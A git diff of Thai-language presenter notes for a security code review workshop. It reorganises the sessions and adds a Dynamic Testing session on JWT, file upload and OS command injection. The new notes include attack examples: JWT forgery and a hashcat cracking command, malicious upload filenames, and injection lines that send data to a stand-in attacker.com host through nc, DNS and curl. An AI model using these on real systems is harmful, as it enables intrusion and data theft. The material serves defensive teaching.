@@ -3,7 +3,59 @@
 
 > สำหรับ presenter อ่านระหว่าง present แยกออกมาเป็นไฟล์เดียว
 > Slide numbers เป็น approximate — Reveal.js นับ nested sections แยก
-> Total: ~54 slides across 13 horizontal positions
+> Updated outline: 4 hours (08:00-12:30) — 5 sessions + Session 5 เป็น Dynamic Testing
+> Appendix A (Docker Security) + Appendix B (CI/CD Integration) = self-study
+
+## Slide Index (new order)
+
+| # | Slide | Section |
+|---|-------|---------|
+| 1 | Title | Opening |
+| 2 | Agenda (4hr timeline) | Opening |
+| 3 | Course Overview | Opening |
+| 4 | Learning Objectives | Opening |
+| 5 | Prerequisites | Opening |
+| 6 | Session 1 Title | Session 1 |
+| 7 | Why Security Code Review? | Session 1 |
+| 8 | Shift-Left Security | Session 1 |
+| 9 | Security Scanning ในวงจร SDLC (NEW) | Session 1 |
+| 10 | Security Activity ในแต่ละ Phase (NEW) | Session 1 |
+| 11 | OWASP Top 10 (2025) Overview | Session 1 |
+| 12-21 | A01 → A10 details | Session 1 |
+| 22 | Session 2 Title | Session 2 |
+| 23 | Security Code Review Checklist | Session 2 |
+| 24 | Exercise 1: Manual Code Review | Session 2 |
+| 25 | Break | — |
+| 26 | Session 3 Title | Session 3 |
+| 27 | 3 Categories of Security Tools | Session 3 |
+| 28 | SAST: Semgrep | Session 3 |
+| 29 | SCA: Syft + Dependency-Track | Session 3 |
+| 30 | Secret Scanning: Gitleaks | Session 3 |
+| 31 | ITSC MIS Use Case (NEW) | Session 3 |
+| 32 | ITSC MIS — Key Takeaways (NEW) | Session 3 |
+| 33 | Session 4 Title | Session 4 |
+| 34 | Lab Setup | Session 4 |
+| 35 | Part A: SAST with Semgrep | Session 4 |
+| 36 | Part B: SCA with Syft | Session 4 |
+| 37 | Part C: Secret Scanning with Gitleaks | Session 4 |
+| 38 | Exercise 3: Fix & Validate | Session 4 |
+| 39 | Part D: Docker Security Review | Session 4 |
+| 40-49 | Docker deep-dive slides | Session 4 |
+| 50 | Session 5 Title — Dynamic Testing | Session 5 |
+| 51 | What is Dynamic Testing? | Session 5 |
+| 52 | 5.1 JWT Intro | Session 5 |
+| 53 | JWT — Common Attacks | Session 5 |
+| 54 | JWT — Mitigations | Session 5 |
+| 55 | 5.2 File Upload Intro | Session 5 |
+| 56 | File Upload — Attack Patterns | Session 5 |
+| 57 | File Upload — Mitigations | Session 5 |
+| 58 | 5.3 OS Command Injection Intro | Session 5 |
+| 59 | OS Command Injection — Patterns | Session 5 |
+| 60 | OS Command Injection — Mitigations | Session 5 |
+| 61 | Wrap-up | Closing |
+| 62 | Thank You | Closing |
+| 63 | Appendix Title (Docker + CI/CD self-study) | Appendix |
+| 64 | Docker Security Scanning Checklist | Appendix |
 
 ---
 
@@ -17,20 +69,30 @@
 
 ---
 
-## Slide 2: Agenda
+## Slide 2: Agenda (4 ชั่วโมง | 08:00-12:30)
 
-- อธิบาย flow คร่าวๆ: เริ่มจากพื้นฐาน (OWASP) → review manual → เรียนรู้ tools → ลงมือ lab → CI/CD
-- เน้นว่า Session 4 (Lab) เป็นหัวใจของ workshop
-- บอกเวลาพัก: 10:15-10:25
+- อธิบาย flow ตาม timeline ใหม่:
+  - 08:00-08:30 Registration
+  - 08:30-09:15 Session 1 (OWASP + SDLC Intro)
+  - 09:15-10:00 Session 2 (Manual Review + Hands-on 1)
+  - 10:00-10:15 Break
+  - 10:15-10:45 Session 3 (Tools Overview + ITSC MIS Use Case)
+  - 10:45-11:30 Session 4 (Hands-on Lab)
+  - 11:30-12:30 Session 5 (Dynamic Testing: JWT / File Upload / OS Command Injection)
+  - 12:30+ Lunch
+- เน้นว่า Session 4 (Lab) และ Session 5 (Dynamic Testing) เป็นหัวใจของ workshop
+- บอกเวลาพัก: 10:00-10:15
+- ไม่มี standalone Q&A — ถามได้ระหว่าง session + Wrap-up รวม Q&A ไว้
 - ให้รู้ว่ามี lab checklist ใน `docs/lab-checklist.md`
+- Appendix A (Docker security) + Appendix B (CI/CD integration) = self-study material
 
 ---
 
 ## Slide 3: Course Overview
 
-- "วันนี้เราจะเรียนรู้ security scanning จริงๆ — ไม่ใช่แค่ทฤษฎี"
-- อธิบาย stat boxes: 5 sessions ครอบคลุมทั้งหมด, 3h แบบ hands-on, 4+ tools ที่จะลองใช้จริง
-- เน้นว่าเป้าหมายคือ "เมื่อเลิกไปวันนี้ คุณสามารถกลับไป scan project ของคุณเองได้ทันที"
+- "วันนี้เราจะเรียนรู้ security scanning + dynamic testing จริงๆ — ไม่ใช่แค่ทฤษฎี"
+- อธิบาย stat boxes: 5 sessions, 4 ชั่วโมง hands-on, 4+ tools ที่จะลองใช้จริง + 3 dynamic testing topics
+- เน้นว่าเป้าหมายคือ "เมื่อเลิกไปวันนี้ คุณสามารถกลับไป scan project ของคุณเอง + เข้าใจ attack patterns ได้ทันที"
 
 ---
 
@@ -73,10 +135,38 @@
 - เปรียบเทียบต้นทุน: ตอน design แก้ฟรี ตอน production แก่ร้อยเท่า
 - ให้มองว่า security scan = automated code reviewer ที่ดูแค่มุม security
 - "Shift-left ไม่ใช่แค่เรื่อง tools — เป็น mindset ที่ต้องคิด security ตั้งแต่เขียน code"
+- Bridge ไป slide ถัดไป: "ถ้าเราเข้าใจ SDLC loop แล้วเราจะรู้ว่า security activity ต้องไปวางที่ไหน"
 
 ---
 
-## Slide 9 (~h.v 6.4): OWASP Top 10 (2025) — Overview
+## Slide 9 (~h.v 6.4): Session 1 Intro — Security Scanning ในวงจร SDLC (NEW)
+
+- "DevOps ไม่ใช่เส้นตรง — เป็น infinity loop: Dev ↔ Ops ตลอดเวลา"
+- วาดหรือชี้ภาพ DevOps infinity loop: **Plan → Code → Build → Test → Release → Deploy → Operate → Monitor → (กลับมา Plan)**
+- ย้ำ key message: "Security ต้องไหลผ่านทุก phase ไม่ใช่ gate เดียวที่ท้าย pipeline"
+- Reference diagram: `https://media.geeksforgeeks.org/wp-content/uploads/20230410112114/DevOps.png`
+- ถาม audience: "ทีมคุณ security อยู่ phase ไหนบ้าง?" — ส่วนใหญ่ตอบ Test/Release เท่านั้น
+- Bridge: "เรามาดูว่าแต่ละ phase ทำ security activity อะไรได้บ้าง"
+
+---
+
+## Slide 10 (~h.v 6.5): Security Activity ในแต่ละ Phase (NEW)
+
+- อ่านตารางทีละ row ให้ผู้เรียนเห็น mapping:
+  - **Plan** → Threat modeling, abuse cases
+  - **Code** → IDE security plugins, pre-commit (Gitleaks)
+  - **Build (CI)** → SAST (Semgrep), SCA (Syft + Dependency-Track), Secret scan
+  - **Test** → DAST baseline
+  - **Release** → Image scan (Trivy/Grype), policy gate
+  - **Deploy / Operate** → Runtime monitoring, vulnerability management, IR
+- "สังเกต tools ที่เราจะใช้วันนี้ — Semgrep, Syft, Gitleaks — อยู่ฝั่งซ้าย (Code + Build) ทั้งหมด = shift-left ที่แท้จริง"
+- "DAST + image scan = Session 5 + Appendix A — เราจะแตะกันใน Session 5 (Dynamic Testing)"
+- "Session 3 จะเห็น real-world pipeline จาก ITSC MIS ว่าเอา tools เหล่านี้มาวางไว้ตรงไหนจริงๆ"
+- Bridge: "ตอนนี้มาดู vulnerability ที่จะเจอใน phase เหล่านี้ — OWASP Top 10"
+
+---
+
+## Slide 11 (~h.v 6.6): OWASP Top 10 (2025) — Overview
 
 - อธิบายสั้นๆ ว่า OWASP คืออะไร: องค์กร nonprofit ที่จัดอันดับ web security risks
 - อัปเดตทุก 3-4 ปี (ล่าสุด 2025)
@@ -86,7 +176,7 @@
 
 ---
 
-## Slide 10 (~h.v 6.5): A01: Broken Access Control
+## Slide 12 (~h.v 6.7): A01: Broken Access Control
 
 - เน้นว่าขึ้นจากอันดับ 5 → 1 เพราะพบบ่อยที่สุด
 - ให้ตัวอย่าง IDOR: "เปลี่ยน URL เลข 1 = เห็นข้อมูลคนอื่น"
@@ -96,7 +186,7 @@
 
 ---
 
-## Slide 11 (~h.v 6.6): A02: Security Misconfiguration
+## Slide 13 (~h.v 6.8): A02: Security Misconfiguration
 
 - เปลี่ยนจากอันดับ 5 → 2 เพราะ misconfiguration พบได้ง่ายและบ่อยมาก
 - DEBUG=True คือตัวอย่าง classic — เจอบ่อยใน production
@@ -105,7 +195,7 @@
 
 ---
 
-## Slide ~: A03: Software Supply Chain Failures (NEW)
+## Slide 14 (~h.v 6.9): A03: Software Supply Chain Failures (NEW)
 
 - หมวดใหม่สำคัญมาก — เกิดจากเหตุการณ์ใหญ่ๆ เช่น SolarWinds และ XZ Utils
 - XZ Utils: "คิดเป็น backdoor ใน open source library ที่ใช้ในทุก Linux distro"
@@ -115,7 +205,7 @@
 
 ---
 
-## Slide ~: A05: Injection
+## Slide 16 (~h.v 6.11): A05: Injection
 
 - นี่คือ vulnerability ที่คนรู้จักดีที่สุด — ให้เน้น
 - SQL Injection: พิมพ์ตัวอย่างลงบน whiteboard หรือให้ผู้เรียนลอง: `' OR 1=1 --`
@@ -125,7 +215,7 @@
 
 ---
 
-## Slide ~: A05: Injection (cont.)
+## Slide 17 (~h.v 6.12): A05: Injection (cont.)
 
 - แสดงตัวอย่าง Python code ทั้ง bad และ good
 - เน้นว่า `subprocess.run([...])` ใช้ list ไม่ใช่ string — ป้องกัน shell injection
@@ -134,7 +224,7 @@
 
 ---
 
-## Slide ~: A06: Insecure Design
+## Slide 18 (~h.v 6.13): A06: Insecure Design
 
 - เน้นว่านี่ต่างจากอันดับอื่น — แก้ด้วย code ไม่ได้ ต้องออกแบบใหม่
 - ตัวอย่าง rate limiting: "ลองนึกว่าถ้าไม่จำกัด login attempt — brute force เล่นเอง"
@@ -143,7 +233,7 @@
 
 ---
 
-## Slide ~: A04: Cryptographic Failures
+## Slide 15 (~h.v 6.10): A04: Cryptographic Failures
 
 - เปลี่ยนจากอันดับ 2 → 4
 - MD5 คือตัวอย่าง classic — เคยใช้กัน เดี๋ยวใช้ bcrypt/argon2
@@ -160,7 +250,7 @@
 
 ---
 
-## Slide 17 (~h.v 6.12): A07: Authentication Failures
+## Slide 19 (~h.v 6.14): A07: Authentication Failures
 
 - เพิ่มชื่อเต็ม: Authentication Failures (ย่อจาก Identification & Authentication)
 - ให้ยกมือถ้าใครในห้องเคยใช้ password '123456'
@@ -170,7 +260,7 @@
 
 ---
 
-## Slide 18 (~h.v 6.13): A08: Software or Data Integrity Failures
+## Slide 20 (~h.v 6.15): A08: Software or Data Integrity Failures
 
 - SolarWinds: "supply chain attack ที่ใหญ่ที่สุด — 18,000+ องค์กร"
 - อธิบายว่าไม่ใช่แค่ install library — CI/CD pipeline เองก็โดนเข้าได้
@@ -179,7 +269,7 @@
 
 ---
 
-## Slide 19 (~h.v 6.14): A09: Logging and Alerting Failures
+## Slide 21 (~h.v 6.16): A09: Logging and Alerting Failures
 
 - เปลี่ยนชื่อเน้น alerting — มี log แต่ไม่มี alert เท่ากับไม่มี
 - "ถ้าไม่ log ก็เหมือนถูกขโมยแล้วไม่รู้"
@@ -189,7 +279,7 @@
 
 ---
 
-## Slide ~: A10: Mishandling of Exceptional Conditions (NEW)
+## Slide 22 (~h.v 6.17): A10: Mishandling of Exceptional Conditions (NEW)
 
 - หมวดใหม่ แทน SSRF (ซึ่งย้ายไป A01)
 - "fail-open vs fail-closed" — อธิบายว่า fail-open อันตรายกว่า: "ระบบทำงานต่อแม้ auth ล้มเหลว"
@@ -200,7 +290,7 @@
 
 ---
 
-## Slide 21 (~h.v 7.1): Session 2 Title
+## Slide 23 (~h.v 7.1): Session 2 Title
 **Manual Code Review Techniques**
 
 - "ตอนนี้เราจะลงมือหาช่องโหว่เอง ก่อนใช้ tools"
@@ -208,7 +298,7 @@
 
 ---
 
-## Slide 22 (~h.v 7.2): Security Code Review Checklist
+## Slide 24 (~h.v 7.2): Security Code Review Checklist
 
 - อ่าน checklist ทั้ง 7 categories ให้ฟัง
 - เน้นว่านี่คือ "minimum" — ควรรู้มากกว่านี้
@@ -216,7 +306,7 @@
 
 ---
 
-## Slide 23 (~h.v 7.3): Exercise 1: Manual Code Review
+## Slide 25 (~h.v 7.3): Exercise 1: Manual Code Review
 
 - **จัดกลุ่ม 2-3 คน**
 - แจก code จาก `lab/vulnerable-app/app.py`
@@ -226,14 +316,14 @@
 
 ---
 
-## Slide 24 (~h.v 8): Break
+## Slide 26 (~h.v 8): Break (10:00-10:15)
 
 - "พัก 10 นาที ก่อนเข้าสู่ส่วน tools"
 - ตอนพัก: ให้ผู้เรียนเปิด laptop ตรวจสอบ tools พร้อม
 
 ---
 
-## Slide 25 (~h.v 9.1): Session 3 Title
+## Slide 27 (~h.v 9.1): Session 3 Title
 **Security Scanning Tools Overview**
 
 - "ตอนนี้เราจะเรียนรู้ tools ที่จะใช้ใน lab"
@@ -242,7 +332,7 @@
 
 ---
 
-## Slide 26 (~h.v 9.2): 3 Categories of Security Tools
+## Slide 28 (~h.v 9.2): 3 Categories of Security Tools
 
 - SAST = static (ไม่ต้อง run code)
 - SCA = dependencies (third-party libraries)
@@ -252,7 +342,7 @@
 
 ---
 
-## Slide 27 (~h.v 9.3): SAST: Semgrep
+## Slide 29 (~h.v 9.3): SAST: Semgrep
 
 - "Semgrep คือ tool หลักที่เราจะใช้วันนี้"
 - เน้นว่า pattern-based ไม่ใช่ regex — เข้าใจโครงสร้าง code
@@ -261,7 +351,7 @@
 
 ---
 
-## Slide 28 (~h.v 9.4): SCA: Syft + Dependency-Track
+## Slide 30 (~h.v 9.4): SCA: Syft + Dependency-Track
 
 - Syft: "สร้าง SBOM (Software Bill of Materials) — รายการอะไรอยู่ในเว็บ"
 - อธิบาย SBOM แบบง่ายๆ: เหมือน.ingredients list ของอาหาร
@@ -271,7 +361,7 @@
 
 ---
 
-## Slide 29 (~h.v 9.5): Secret Scanning: Gitleaks
+## Slide 31 (~h.v 9.5): Secret Scanning: Gitleaks
 
 - "Gitleaks คือ tool ที่ค้นหา secrets ที่ commit เข้า git โดยไม่ตั้งใจ"
 - เน้นว่า scan Git history ทั้งหมด — ไม่ใช่แค่ working directory
@@ -280,7 +370,42 @@
 
 ---
 
-## Slide 30 (~h.v 10.1): Session 4 Title
+## Slide 32 (~h.v 9.6): ITSC MIS Use Case (NEW)
+
+- Frame: "เราเรียน tools แยกๆ มาแล้ว — ตอนนี้ดู real-world reference architecture ว่ามันรวมใน production pipeline ยังไง"
+- นี่คือ pipeline จริงของ ITSC MIS — "production system ของธนาคาร/enterprise จริง"
+- เดิน flow ตามภาพทีละขั้น:
+  1. **GitLab Repo** — source of truth
+  2. **CI**:
+     - Unit Testing (baseline quality gate)
+     - **SAST + Secret Scan**: Trivy + Gitleaks → ถ้าเจอ critical = fail build
+     - Build Artifact
+     - Docker Image Build & Push → tag v2.4
+     - **Grype Security Scan** ที่ image v2.4 → CVE check
+     - **Security Policy Check** — gate สำคัญที่สุด ถ้าไม่ผ่าน block deploy
+     - Update Kubernetes Manifest
+  3. **CD**: `kubectl apply` → Kubernetes Cluster
+  4. **DAST**: Burp-DAST Baseline หลัง deploy
+  5. **Reports & Tracking**: dependency-track + DefectDojo (aggregator)
+  6. **Notifications**: notify_ci_pipeline / notify_failure / notify_security_alert
+- ย้ำ: "นี่ไม่ใช่ theoretical — มันคือ pipeline ที่มีอยู่จริง tools ที่เราใช้วันนี้ (Semgrep/Trivy, Syft, Gitleaks, Grype, Dependency-Track, DefectDojo) มีที่ทางหมด"
+- ถ้ามีเวลา: ชี้ Reference image `/tmp/devday-refs/itsc-mis.png`
+
+---
+
+## Slide 33 (~h.v 9.7): ITSC MIS — Key Takeaways (NEW)
+
+- อ่าน key points ทีละข้อ:
+  - **Tools อยู่ถูกที่** — ทุก tool ที่เราเรียนวันนี้อยู่ใน pipeline จริง ไม่ใช่ของเล่น
+  - **Security Policy Check คือ hard gate** — ไม่ผ่าน = ไม่ deploy (block, ไม่ใช่ warn)
+  - **DAST หลัง deploy** = Dynamic Testing ที่ Session 5 เราจะเจาะลึก (JWT, File Upload, OS Command Injection)
+  - **Reporting ที่ dependency-track + DefectDojo** = ไม่กระจัดกระจาย มี single pane of glass
+  - **3 Notification channels** = no silent failure — ทุกอย่าง trace ได้
+- Bridge ไป Session 4: "ตอนนี้เรารู้ pipeline ใหญ่แล้ว — ได้เวลาลงมือทำกับ tools จริง"
+
+---
+
+## Slide 34 (~h.v 10.1): Session 4 Title
 **Hands-on Lab — Security Scanning**
 
 - "นี่คือส่วนที่สำคัญที่สุดของวันนี้"
@@ -289,7 +414,7 @@
 
 ---
 
-## Slide 31 (~h.v 10.2): Lab Setup
+## Slide 35 (~h.v 10.2): Lab Setup
 
 - ให้ clone repo ถ้ายังไม่ได้ clone
 - verify tools: `semgrep --version`, `syft --version`, `gitleaks version`
@@ -298,7 +423,7 @@
 
 ---
 
-## Slide 32 (~h.v 10.3): Part A: SAST with Semgrep
+## Slide 36 (~h.v 10.3): Part A: SAST with Semgrep
 
 - ให้รันคำสั่งตาม slide
 - อธิบาย step 1-2: "รันแล้วดู output"
@@ -309,7 +434,7 @@
 
 ---
 
-## Slide 33 (~h.v 10.4): Part B: SCA with Syft + Dependency-Track
+## Slide 37 (~h.v 10.4): Part B: SCA with Syft + Dependency-Track
 
 - ให้รัน `syft . -o cyclonedx-json > sbom.json`
 - "เปิด sbom.json ดู — จะเห็น dependency ทั้งหมดพร้อม version"
@@ -319,7 +444,7 @@
 
 ---
 
-## Slide 34 (~h.v 10.5): Part C: Secret Scanning with Gitleaks
+## Slide 38 (~h.v 10.5): Part C: Secret Scanning with Gitleaks
 
 - ให้รัน gitleaks detect
 - "ดูว่าเจอ secret อะไรบ้าง — API key, password, token"
@@ -330,7 +455,7 @@
 
 ---
 
-## Slide 35 (~h.v 10.6): Exercise 3: Fix & Validate
+## Slide 39 (~h.v 10.6): Exercise 3: Fix & Validate
 
 - "เลือก 3-5 critical/high vulnerabilities ที่พบ แล้วแก้ไข"
 - ให้เปิด `app.py` แล้วแก้:
@@ -342,7 +467,7 @@
 
 ---
 
-## Slide 36 (~h.v 10.7): Part D: Docker Security Review
+## Slide 40 (~h.v 10.7): Part D: Docker Security Review
 
 - "ตอนนี้เรามอง security ในอีกมุม — infrastructure as code"
 - "เช่นเดียวกับ code, Dockerfile และ docker-compose.yml ก็มีช่องโหว่ได้"
@@ -352,7 +477,7 @@
 
 ---
 
-## Slide 37 (~h.v 10.8): Why Docker Security Matters
+## Slide 41 (~h.v 10.8): Why Docker Security Matters
 
 - **Container ≠ VM** — นี่คือจุดเริ่มต้น "container ปลอดภัยอยู่แล้ว" ที่หลายหลายเห็น
 - อธิบาย concept: container แชร์ kernel กับ host — ไม่ได้ isolate แบบ VM
@@ -363,7 +488,7 @@
 
 ---
 
-## Slide 38 (~h.v 10.9): Image Security — Layers & Supply Chain
+## Slide 42 (~h.v 10.9): Image Security — Layers & Supply Chain
 
 - อธิบาย layers: base image → dependencies → app code → config
 - "ทุก layer ที่เพิ่มเข้าไปคือ attack surface เพิ่มขึ้น"
@@ -375,7 +500,7 @@
 
 ---
 
-## Slide 39 (~h.v 10.10): Container Escape — What Happens When Root?
+## Slide 43 (~h.v 10.10): Container Escape — What Happens When Root?
 
 - Slide นี้สำคัญมากเพื่อสร้าง "wow factor" และทำให้เข้าใจถึงปัญหา root container
 - **Attack chain** อธิบายทีละขั้น:
@@ -390,7 +515,7 @@
 
 ---
 
-## Slide 40 (~h.v 10.11): Secrets Management in Containers
+## Slide 44 (~h.v 10.11): Secrets Management in Containers
 
 - เริ่มด้วย demo: `docker inspect` แสดง env vars — "ลองรันที่เครื่องดู จะเห็น password ทุกอัน"
 - "docker compose config ก็แสดงทุก secret ง่ายๆ"
@@ -404,7 +529,7 @@
 
 ---
 
-## Slide 41 (~h.v 10.12): Docker Scanning Tools
+## Slide 45 (~h.v 10.12): Docker Scanning Tools
 
 - สรุป: "ทีมนี้เราใช้ Syft (SBOM) + Gitleaks (secrets) อยู่แล้ว ตอนนี้เพิ่ม image scanning"
 - **Trivy**: "comprehensive — scan ทั้ง image, filesystem, IaC, secrets ฟรี และครบบ" — แนะนำให้ลอง `trivy image <name>` ดู
@@ -415,7 +540,7 @@
 
 ---
 
-## Slide 42 (~h.v 10.13): Dockerfile Vulnerabilities
+## Slide 46 (~h.v 10.13): Dockerfile Vulnerabilities
 
 - อ่านตารางทีละแถว อธิบายสั้นๆ — **เพิ่ม Impact column แล้ว**
 - เน้น "root container" และ "unpinned image" เป็น critical — ให้อธิบาย impact
@@ -426,7 +551,7 @@
 
 ---
 
-## Slide 40: docker-compose.yml Vulnerabilities
+## Slide 47 (~h.v 10.14): docker-compose.yml Vulnerabilities
 
 - เน้น "secrets in plaintext env vars" เป็น critical — ให้แสดงว่า `docker inspect` เห็นได้
 - "เห็น `DB_PASSWORD=supersecret123` ใน code — ใครก็เห็นได้"
@@ -438,7 +563,7 @@
 
 ---
 
-## Slide 44 (~h.v 10.15): Secure Dockerfile — Key Fixes
+## Slide 48 (~h.v 10.15): Secure Dockerfile — Key Fixes
 
 - อธิบายแต่ละ fix:
   - Multi-stage: "แยก build กับ runtime — final image เล็กลง, attack surface ลดลง"
@@ -451,7 +576,7 @@
 
 ---
 
-## Slide 45 (~h.v 10.16): Secure docker-compose.yml — Key Fixes
+## Slide 49 (~h.v 10.16): Secure docker-compose.yml — Key Fixes
 
 - Secrets: "ใช้ Docker secrets แทน env vars — ไม่เห็นใน code และ inspect"
   - "file: ./secrets/db_password.txt = อ่านจาก file, ไม่อยู่ใน compose"
@@ -471,77 +596,172 @@
 
 ---
 
-## Slide 46 (~h.v 11.1): Session 5 Title
-**CI/CD Integration & Best Practices**
+## Slide 50 (~h.v 11.1): Session 5 Title — Dynamic Testing
+**Dynamic Testing (60 min): JWT / File Upload / OS Command Injection**
 
-- "ตอนนี้เรารู้จัก tools แล้ว — ถ้าใส่ pipeline จะเป็นยังไง?"
-- "เป้าหมายคือ security เป็นส่วนหนึ่งของ development workflow ไม่ใช่ขั้นตอนแยก"
-
----
-
-## Slide 47 (~h.v 11.2): Security in CI/CD Pipeline
-
-- อธิบาย flow: pre-commit → PR → build → post-build → weekly
-- "ทุก stage มี security check"
-- เน้นว่า PR check เป็น gate สำคัญ: "ถ้า Semgrep เจอ critical → block merge"
-- Weekly scan: "ตรวจสอบเต็มรูปแบบทุกสัปดาห์"
+- "Session 5 เปลี่ยนจากเดิม (CI/CD Integration) มาเป็น Dynamic Testing — เพราะ CI/CD overlap กับ ITSC MIS use case ที่เราดูไป Session 3 แล้ว"
+- Frame: "SAST scanning = ตรวจ code ตอนหยุด, Dynamic testing = ตรวจ application ตอน run จริง"
+- "3 topic วันนี้คือช่องโหว่ที่ SAST ไม่เห็น และพบบ่อยสุดใน pentest report"
+- เวลา ~20 นาที/topic — ถ้า topic ไหนเสร็จเร็ว ให้เวลา Q&A discussion
+- CI/CD content เดิม ย้ายไป **Appendix B (self-study)** แล้ว — ชี้ให้ผู้เรียนอ่านต่อเองที่บ้าน
 
 ---
 
-## Slide 48 (~h.v 11.3): GitHub Actions Example
+## Slide 51 (~h.v 11.2): What is Dynamic Testing?
 
-- อ่าน YAML ทีละ job อธิบาย
-- Semgrep action: "เพิ่มใน repo แล้วมัน scanทุก PR อัตโนมัติ"
-- Gitleaks action: "block secrets ก่อนเข้า code"
-- "GitHub Actions config ที่เห็นนี่ใช้ได้เลย — copy ไปใส่ repo ได้"
-- GitLab CI / Jenkins versions อยู่ใน handout
-
----
-
-## Slide 49 (~h.v 11.4): Best Practices
-
-- อ่านทีละข้ออธิบายสั้นๆ
-- เน้น 3 ข้อแรก:
-  1. **Scan Early** — "ยิ่งเร็วยิ่งถูก ยิ่งถูกที่สุด"
-  2. **Automate** — "ถ้าต้องจำทุกครั้ง มันจะไม่เกิดขึ้น"
-  3. **Fix Critical First** — "อย่าไปแก้ low ก่อนเพราะมันง่าย — critical มีผลกระทบสูงสุด"
-- "Security Champions = developer ในทีมที่เป็น security expert คนแรกที่ถาม"
+- "SAST = static, ไม่ต้อง run — อ่าน source code หา pattern"
+- "DAST / Dynamic = ต้อง run app จริง ส่ง request เข้าไป ดู response"
+- "ของบางอย่างเห็นเฉพาะตอน runtime: business logic, authentication flow, runtime config"
+- ย้ำ: ใน ITSC MIS pipeline = Burp-DAST Baseline ที่เรา mention ไป Session 3
+- "วันนี้เราจะเน้น 3 vulnerability ที่ common มาก แต่คนส่วนใหญ่ยังไม่รู้จักดี"
 
 ---
 
-## Slide 50 (~h.v 12.1): Wrap-up
+## Slide 52 (~h.v 11.3): 5.1 JSON Web Token (JWT) Intro
+
+- "JWT เป็นมาตรฐาน token สำหรับ authentication — ใครเขียน API น่าจะเจอเกือบทุกคน"
+- แยกโครงสร้าง 3 ส่วน: `header.payload.signature`
+- "ส่วนใหญ่ dev จะ trust library blindly — นั่นคือจุดที่ attacker exploit"
+- "เรามาดู 5 attack patterns ที่พบใน pentest"
+
+---
+
+## Slide 53 (~h.v 11.4): JWT — Common Attacks
+
+- **`alg=none` attack**: "attacker แก้ header เป็น `{"alg":"none"}` → server ยอมรับ token ไม่มี signature → ปลอม identity ได้"
+  - "Library เก่าบางตัวยอมรับ `alg=none` โดย default — ล่าสุดก็ยังเจอใน production"
+- **Weak secret / brute-force HS256**: "HS256 ใช้ secret เดียว — ถ้า secret คือ 'secret' / 'password' → ใช้ `jwt_tool` หรือ hashcat brute ได้ในไม่กี่นาที"
+  - Demo (ถ้ามีเวลา): `hashcat -m 16500 token.txt rockyou.txt`
+- **No expiry / token replay**: "token ไม่มี `exp` claim → ใช้ได้ตลอดชาติ — ถ้า leak แล้วไม่สามารถ revoke"
+- **Algorithm confusion (RS256 → HS256)**: "server ประกาศใช้ RS256 (asymmetric) แต่ library check ไม่แน่น — attacker ส่ง token เป็น HS256 โดยใช้ public key เป็น secret → server verify ผ่าน"
+- **Missing `kid` validation**: "`kid` = key id ที่ดึง key file — attacker ใส่ `kid=../../etc/passwd` → path traversal"
+
+---
+
+## Slide 54 (~h.v 11.5): JWT — Mitigations
+
+- **Enforce `alg` server-side**: "อย่าเชื่อ `alg` จาก header — hardcode ฝั่ง server ว่าใช้ algorithm ไหน"
+- **Strong 256-bit secret**: "ไม่ใช้ string มนุษย์อ่านออก — generate ด้วย `openssl rand -base64 32`"
+- **Short expiry + refresh tokens**: "access token 5-15 นาที, refresh token ใน httpOnly cookie"
+- **`kid` validation**: "allowlist เฉพาะ kid ที่รู้จัก, ไม่ใช้ค่า kid เป็น file path"
+- **Library hardening**: "ใช้ library ที่ update ล่าสุด อย่าใช้ `jwt.decode(verify=False)` เด็ดขาด"
+- ถ้ามีเวลา: "revocation list / deny list = backup plan ถ้า token leak"
+
+---
+
+## Slide 55 (~h.v 11.6): 5.2 File Upload Intro
+
+- "File upload = vulnerability ที่ developer ส่วนใหญ่ underestimate"
+- "ถ้าให้ user upload file แล้ว app คุณสามารถ: RCE, XSS, SSRF, path traversal ได้เลยในตัวเดียว"
+- "เราจะดู 4 attack patterns + mitigations"
+
+---
+
+## Slide 56 (~h.v 11.7): File Upload — Attack Patterns
+
+- **Extension bypass**:
+  - "Double extension: `shell.php.jpg` → server ที่ check แค่ extension สุดท้ายจะ fail — แต่บาง server รัน PHP เพราะมี `.php`"
+  - "Null byte: `shell.php%00.jpg` — legacy PHP/Perl จะ truncate ที่ null byte → execute เป็น PHP"
+  - "Case variations: `.PhP`, `.pHtml` — ถ้า check case-sensitive จะพลาด"
+- **MIME type spoofing**:
+  - "attacker ตั้ง `Content-Type: image/jpeg` — แต่ file จริงเป็น PHP"
+  - "อย่า trust Content-Type header — มันคือ user input"
+- **Path traversal in filename**:
+  - "`filename=../../etc/passwd` — ถ้าเอาไป concat path → เขียนทับระบบ"
+  - Windows: `..\\..\\windows\\system32\\config\\sam`
+- **Polyglot files**:
+  - "ไฟล์เดียวเป็น valid JPG + valid PHP + valid HTML พร้อมกัน"
+  - "pass image validation แต่ execute เป็น PHP เมื่อ include"
+- Live example (ถ้ามีเวลา): แสดง `file` command vs extension — "magic bytes บอกความจริง"
+
+---
+
+## Slide 57 (~h.v 11.8): File Upload — Mitigations
+
+- **Extension allowlist, not blocklist**: "ระบุเฉพาะที่อนุญาต — `.jpg, .png, .pdf` เท่านั้น"
+- **Magic-byte validation**: "อ่าน first bytes ของ file จริง (เช่น `\xFF\xD8\xFF` = JPEG) — อย่าเชื่อ Content-Type หรือ extension"
+- **Store outside webroot**: "save ที่ `/var/uploads/` ไม่ใช่ `/var/www/html/uploads/` — เพื่อไม่ให้ server execute"
+- **Randomize filenames**: "ใช้ UUID หรือ hash — ไม่เก็บ original filename (strip ด้วย path traversal)"
+- **ClamAV หรือ antivirus scan**: "บังคับ scan ทุก upload ก่อน save"
+- **Separate domain for uploads**: "user-content.example.com — isolate cookie scope + CSP"
+- **Size limits + rate limits**: "กัน DoS"
+- ย้ำ: "ทำทุกข้อ — defense in depth ไม่ใช่เลือกทำข้อเดียว"
+
+---
+
+## Slide 58 (~h.v 11.9): 5.3 OS Command Injection Intro
+
+- "Injection ประเภทที่ร้ายแรงที่สุด — ได้ shell บน server"
+- "พบบ่อยใน: feature 'ping host', 'nslookup', 'convert image', 'backup database' ที่เรียก external binary"
+- "เราจะดู 3 attack patterns + mitigations — และตัวอย่างใน `app.py` ของ lab"
+
+---
+
+## Slide 59 (~h.v 11.10): OS Command Injection — Patterns
+
+- **Shell metacharacters**: `;`, `|`, `&`, `$()`, backticks
+  - "`ping 127.0.0.1; cat /etc/passwd` — `;` แยก command → cat ทำงานต่อ"
+  - "`ping 127.0.0.1 | nc attacker.com 4444` — redirect output ออกเน็ต"
+  - "`ping $(whoami).attacker.com` — DNS exfil ง่ายๆ"
+- **Argument injection**:
+  - "`curl -o /etc/passwd attacker.com/file`"
